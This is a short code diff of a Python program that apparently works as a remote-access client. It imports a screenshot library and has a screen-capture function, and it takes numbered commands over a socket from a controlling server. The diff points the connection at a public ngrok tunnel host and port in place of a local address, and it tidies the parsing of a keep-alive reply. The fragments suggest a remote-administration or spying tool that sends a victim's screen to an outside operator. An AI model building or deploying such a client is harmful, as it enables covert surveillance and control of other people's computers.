@@ -7,7 +7,7 @@ import mss
 
 
 
-address = ("0.0.0.0", 3000)
+address = ("2.tcp.ngrok.io", 15546)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -133,8 +133,8 @@ def main():
         elif choice == "3":
             pass
         elif choice == "4":
-            keep_alive = recv().decode()
-            if keep_alive.lower() == "y" or keep_alive.lower() == "yes":
+            keep_alive = recv().decode().lower()
+            if keep_alive == "y" or keep_alive == "yes":
                 server_con.shutdown(socket.SHUT_WR)
                 server_con.close()
                 time.sleep(5)
